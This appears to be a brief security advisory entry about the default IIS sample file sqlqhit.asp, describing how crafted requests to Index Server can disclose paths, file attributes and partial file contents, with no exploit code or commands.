The sqlqhit.asp sample file is used for performing web-based SQL queries.

Malicious users could send specifically crafted HTTP request to an Internet Information Services server running Index Server to reveal path information, file attributes, and possibly some lines of the file contents.

The sqlqhit.asp file is located in the \inetpub\iissamples\ISSamples\ folder and is installed by default.
